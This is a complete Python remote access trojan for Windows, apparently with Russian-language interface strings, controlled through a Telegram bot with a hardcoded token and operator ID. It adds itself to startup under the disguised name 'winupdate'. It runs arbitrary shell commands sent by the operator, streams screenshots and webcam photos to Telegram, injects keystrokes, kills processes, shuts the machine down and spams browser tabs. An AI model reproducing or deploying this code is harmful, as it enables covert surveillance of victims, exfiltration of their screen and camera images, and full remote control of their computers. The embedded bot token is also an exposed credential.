import os
import sys
import logging
import time
from pynput.keyboard import Key, Controller
import pyautogui
import webbrowser
import telebot
from telebot import types
import cv2
import threading
import subprocess
import ctypes
import winreg
from PIL import Image
import psutil

bot = telebot.TeleBot('7663601253:AAErvm-i-qXkZ0KF8UuZNrbq99Cd6xFx5ck')
keyboard = Controller()
link_spam_active = False
current_spam_link = ""
screen_streaming_active = False

def add_to_startup():
    if sys.platform == 'win32':
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
                winreg.SetValueEx(reg_key, "winupdate", 0, winreg.REG_SZ, os.path.abspath(sys.argv[0]))
        except Exception:
            pass

def use_webcam():
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                cv2.imwrite('webcam.jpg', cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
                cap.release()
                return 'webcam.jpg'
        return None
    except Exception:
        return None

def link_spammer():
    global link_spam_active, current_spam_link
    while link_spam_active:
        try:
            webbrowser.open(current_spam_link)
            time.sleep(1)
        except Exception:
            time.sleep(1)

def set_wallpaper(image_path):
    try:
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –æ–±–æ–µ–≤: {e}")
        return False

def screen_streamer(chat_id):
    global screen_streaming_active
    while screen_streaming_active:
        try:
            screenshot_path = 'stream.png'
            pyautogui.screenshot(screenshot_path)
            with open(screenshot_path, 'rb') as photo:
                bot.send_photo(chat_id, photo)
            os.remove(screenshot_path)
            time.sleep(1)
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ —Ç—Ä–∞–Ω—Å–ª—è—Ü–∏–∏: {e}")
            time.sleep(1)

def show_windows_message(title, text):
    try:
        ctypes.windll.user32.MessageBoxW(0, text, title, 0x40 | 0x1)
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è: {e}")
        return False

def type_text(text):
    try:
        keyboard.type(text)
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤–≤–æ–¥–∞ —Ç–µ–∫—Å—Ç–∞: {e}")
        return False

def get_running_processes():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'].endswith('.exe'):
                    processes.append(proc.info['name'])
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        return list(set(processes))  # –£–¥–∞–ª—è–µ–º –¥—É–±–ª–∏–∫–∞—Ç—ã
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤: {e}")
        return []

def kill_process(process_name):
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == process_name.lower():
                proc.kill()
                return True
        return False
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞: {e}")
        return False

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.from_user.id == 1734359786:
        bot.send_message(message.chat.id, "ü§ñ –ë–æ—Ç –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ! –í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=get_main_menu())
    else:
        bot.send_message(message.chat.id, "‚õî –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω")

def get_main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=3, resize_keyboard=True)
    row1 = ['üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç', 'üåê –û—Ç–∫—Ä—ã—Ç—å —Å–∞–π—Ç', 'üì∑ –í–µ–±–∫–∞–º–µ—Ä–∞']
    row2 = ['‚ùå –ó–∞–∫—Ä—ã—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É', 'üîå –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö', 'üîÑ –°–ø–∞–º —Å—Å—ã–ª–∫–æ–π']
    row3 = ['üñºÔ∏è –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –æ–±–æ–∏', 'üóûÔ∏è Win+D', '‚å®Ô∏è –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞']
    row4 = ['‚å®Ô∏è –ö–æ–º–∞–Ω–¥–∞ CMD', 'üñ•Ô∏è –¢—Ä–∞–Ω—Å–ª—è—Ü–∏—è —ç–∫—Ä–∞–Ω–∞', '‚èπÔ∏è –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ç—Ä–∞–Ω—Å–ª—è—Ü–∏—é']
    row5 = ['üìä –ü—Ä–æ—Ü–µ—Å—Å—ã', '‚ùå –ó–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å']
    markup.add(*row1)
    markup.add(*row2)
    markup.add(*row3)
    markup.add(*row4)
    markup.add(*row5)
    return markup

@bot.message_handler(func=lambda m: m.text == 'üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç' and m.from_user.id == 1734359786)
def send_screenshot(message):
    try:
        pyautogui.screenshot('screen.png')
        with open('screen.png', 'rb') as photo:
            bot.send_photo(message.chat.id, photo, caption="üñ•Ô∏è –í–æ—Ç –≤–∞—à —Å–∫—Ä–∏–Ω—à–æ—Ç!")
        os.remove('screen.png')
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {e}")

@bot.message_handler(func=lambda m: m.text == 'üåê –û—Ç–∫—Ä—ã—Ç—å —Å–∞–π—Ç' and m.from_user.id == 1734359786)
def ask_url(message):
    msg = bot.send_message(message.chat.id, "üîó –í–≤–µ–¥–∏—Ç–µ URL —Å–∞–π—Ç–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä: youtube.com):", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, open_url)

def open_url(message):
    if message.from_user.id == 1734359786:
        url = message.text if message.text.startswith(('http://', 'https://')) else 'http://' + message.text
        try:
            webbrowser.open(url)
            bot.send_message(message.chat.id, f"üåç –û—Ç–∫—Ä—ã–≤–∞—é: {url}", reply_markup=get_main_menu())
        except Exception as e:
            bot.send_message(message.chat.id, f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {e}", reply_markup=get_main_menu())

@bot.message_handler(func=lambda m: m.text == '‚ùå –ó–∞–∫—Ä—ã—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É' and m.from_user.id == 1734359786)
def alt_f4(message):
    try:
        keyboard.press(Key.alt)
        keyboard.press(Key.f4)
        keyboard.release(Key.f4)
        keyboard.release(Key.alt)
        bot.send_message(message.chat.id, "üîÑ Alt+F4 –≤—ã–ø–æ–ª–Ω–µ–Ω–æ!")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {e}")

@bot.message_handler(func=lambda m: m.text == 'üîå –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö' and m.from_user.id == 1734359786)
def shutdown(message):
    try:
        os.system('shutdown /s /t 1')
        bot.send_message(message.chat.id, "‚è≥ –ö–æ–º–ø—å—é—Ç–µ—Ä –≤—ã–∫–ª—é—á–∞–µ—Ç—Å—è...")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {e}")

@bot.message_handler(func=lambda m: m.text == 'üîÑ –°–ø–∞–º —Å—Å—ã–ª–∫–æ–π' and m.from_user.id == 1734359786)
def toggle_link_spam(message):
    global link_spam_active, current_spam_link
    if link_spam_active:
        link_spam_active = False
        bot.send_message(message.chat.id, "üõë –°–ø–∞–º —Å—Å—ã–ª–∫–æ–π –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω", reply_markup=get_main_menu())
    else:
        msg = bot.send_message(message.chat.id, "üîó –í–≤–µ–¥–∏—Ç–µ URL –¥–ª—è —Å–ø–∞–º–∞:", reply_markup=types.ReplyKeyboardRemove())
        bot.register_next_step_handler(msg, start_link_spam)

def start_link_spam(message):
    global link_spam_active, current_spam_link
    if message.from_user.id == 1734359786:
        current_spam_link = message.text if message.text.startswith(('http://', 'https://')) else 'http://' + message.text
        link_spam_active = True
        threading.Thread(target=link_spammer, daemon=True).start()
        bot.send_message(message.chat.id, f"üåÄ –ù–∞—á–∏–Ω–∞—é —Å–ø–∞–º —Å—Å—ã–ª–∫–æ–π: {current_spam_link}", reply_markup=get_main_menu())

@bot.message_handler(func=lambda m: m.text == 'üì∑ –í–µ–±–∫–∞–º–µ—Ä–∞' and m.from_user.id == 1734359786)
def webcam(message):
    photo = use_webcam()
    if photo:
        with open(photo, 'rb') as p:
            bot.send_photo(message.chat.id, p, caption="üì∏ –§–æ—Ç–æ —Å –≤–µ–±–∫–∞–º–µ—Ä—ã")
        os.remove(photo)
    else:
        bot.send_message(message.chat.id, "‚ö†Ô∏è –í–µ–±–∫–∞–º–µ—Ä–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞")

@bot.message_handler(func=lambda m: m.text == 'üñºÔ∏è –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –æ–±–æ–∏' and m.from_user.id == 1734359786)
def ask_wallpaper(message):
    msg = bot.send_message(message.chat.id, "üñºÔ∏è –û—Ç–ø—Ä–∞–≤—å—Ç–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –≤ —Ñ–æ—Ä–º–∞—Ç–µ PNG", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, set_wallpaper_handler)

def set_wallpaper_handler(message):
    try:
        if message.content_type != 'photo':
            bot.send_message(message.chat.id, "‚ùå –≠—Ç–æ –Ω–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ!", reply_markup=get_main_menu())
            return
            
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open('wallpaper.png', 'wb') as new_file:
            new_file.write(downloaded_file)
        
        if set_wallpaper(os.path.abspath('wallpaper.png')):
            bot.send_message(message.chat.id, "‚úÖ –û–±–æ–∏ —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã!", reply_markup=get_main_menu())
        else:
            bot.send_message(message.chat.id, "‚ùå –û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –æ–±–æ–µ–≤", reply_markup=get_main_menu())
            
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {str(e)}", reply_markup=get_main_menu())
    finally:
        if os.path.exists('wallpaper.png'):
            os.remove('wallpaper.png')

@bot.message_handler(func=lambda m: m.text == 'üóûÔ∏è Win+D' and m.from_user.id == 1734359786)
def win_d_handler(message):
    try:
        keyboard.press(Key.cmd)
        keyboard.press('d')
        keyboard.release('d')
        keyboard.release(Key.cmd)
        bot.send_message(message.chat.id, "üóûÔ∏è –ö–æ–º–±–∏–Ω–∞—Ü–∏—è Win+D –≤—ã–ø–æ–ª–Ω–µ–Ω–∞!")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {str(e)}")

@bot.message_handler(func=lambda m: m.text == '‚å®Ô∏è –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞' and m.from_user.id == 1734359786)
def ask_keyboard_text(message):
    msg = bot.send_message(message.chat.id, "‚å®Ô∏è –í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –¥–ª—è –≤–≤–æ–¥–∞ —Å –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã:", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, type_text_handler)

def type_text_handler(message):
    try:
        text = message.text
        if type_text(text):
            bot.send_message(message.chat.id, "‚úÖ –¢–µ–∫—Å—Ç —É—Å–ø–µ—à–Ω–æ –≤–≤–µ–¥–µ–Ω!", reply_markup=get_main_menu())
        else:
            bot.send_message(message.chat.id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –≤–≤–µ—Å—Ç–∏ —Ç–µ–∫—Å—Ç", reply_markup=get_main_menu())
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {str(e)}", reply_markup=get_main_menu())

@bot.message_handler(func=lambda m: m.text == 'üìä –ü—Ä–æ—Ü–µ—Å—Å—ã' and m.from_user.id == 1734359786)
def show_processes(message):
    try:
        processes = get_running_processes()
        if processes:
            processes_str = "\n".join(processes)
            if len(processes_str) > 4000:
                processes_str = processes_str[:4000] + "\n... (—Å–ø–∏—Å–æ–∫ –æ–±—Ä–µ–∑–∞–Ω)"
            bot.send_message(message.chat.id, f"üìä –°–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤:\n```\n{processes_str}\n```", 
                           parse_mode='Markdown', reply_markup=get_main_menu())
        else:
            bot.send_message(message.chat.id, "‚ÑπÔ∏è –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤", reply_markup=get_main_menu())
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {str(e)}", reply_markup=get_main_menu())

@bot.message_handler(func=lambda m: m.text == '‚ùå –ó–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å' and m.from_user.id == 1734359786)
def ask_process_to_kill(message):
    msg = bot.send_message(message.chat.id, "‚ùå –í–≤–µ–¥–∏—Ç–µ –∏–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è (–Ω–∞–ø—Ä–∏–º–µ—Ä: brave.exe):", 
                          reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, kill_process_handler)

def kill_process_handler(message):
    try:
        process_name = message.text.strip()
        if kill_process(process_name):
            bot.send_message(message.chat.id, f"‚úÖ –ü—Ä–æ—Ü–µ—Å—Å {process_name} —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω!", reply_markup=get_main_menu())
        else:
            bot.send_message(message.chat.id, f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å {process_name}", reply_markup=get_main_menu())
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {str(e)}", reply_markup=get_main_menu())

@bot.message_handler(func=lambda m: m.text == '‚å®Ô∏è –ö–æ–º–∞–Ω–¥–∞ CMD' and m.from_user.id == 1734359786)
def ask_cmd_command(message):
    msg = bot.send_message(message.chat.id, "‚å®Ô∏è –í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è:", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, execute_cmd)

def execute_cmd(message):
    try:
        command = message.text
        result = subprocess.run(
            command, 
            shell=True,
            capture_output=True,
            text=True,
            encoding='cp866'
        )
        
        output = result.stdout or result.stderr
        if not output:
            output = "–ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ –±–µ–∑ –≤—ã–≤–æ–¥–∞"
            
        if len(output) > 4000:
            output = output[:4000] + "\n... (–≤—ã–≤–æ–¥ –æ–±—Ä–µ–∑–∞–Ω)"
            
        bot.send_message(message.chat.id, f"üìü –†–µ–∑—É–ª—å—Ç–∞—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è:\n```\n{output}\n```", 
                        parse_mode='Markdown', reply_markup=get_main_menu())
                        
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {str(e)}", reply_markup=get_main_menu())

@bot.message_handler(func=lambda m: m.text == 'üñ•Ô∏è –¢—Ä–∞–Ω—Å–ª—è—Ü–∏—è —ç–∫—Ä–∞–Ω–∞' and m.from_user.id == 1734359786)
def start_screen_stream(message):
    global screen_streaming_active
    if not screen_streaming_active:
        screen_streaming_active = True
        threading.Thread(target=screen_streamer, args=(message.chat.id,), daemon=True).start()
        bot.send_message(message.chat.id, "üñ•Ô∏è –¢—Ä–∞–Ω—Å–ª—è—Ü–∏—è —ç–∫—Ä–∞–Ω–∞ –Ω–∞—á–∞—Ç–∞!")
    else:
        bot.send_message(message.chat.id, "üåÄ –¢—Ä–∞–Ω—Å–ª—è—Ü–∏—è —É–∂–µ –∑–∞–ø—É—â–µ–Ω–∞")

@bot.message_handler(func=lambda m: m.text == '‚èπÔ∏è –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ç—Ä–∞–Ω—Å–ª—è—Ü–∏—é' and m.from_user.id == 1734359786)
def stop_screen_stream(message):
    global screen_streaming_active
    if screen_streaming_active:
        screen_streaming_active = False
        if os.path.exists('stream.png'):
            os.remove('stream.png')
        bot.send_message(message.chat.id, "‚èπÔ∏è –¢—Ä–∞–Ω—Å–ª—è—Ü–∏—è –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞")
    else:
        bot.send_message(message.chat.id, "‚ÑπÔ∏è –¢—Ä–∞–Ω—Å–ª—è—Ü–∏—è –Ω–µ –∞–∫—Ç–∏–≤–Ω–∞")

try:
    bot.send_message(1734359786, "ü§ñ –ë–æ—Ç —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω! –í—Å–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–æ—Å—Ç—É–ø–Ω—ã.")
    add_to_startup()
except Exception:
    pass

while True:
    try:
        bot.polling(none_stop=True)
    except Exception:
        time.sleep(15)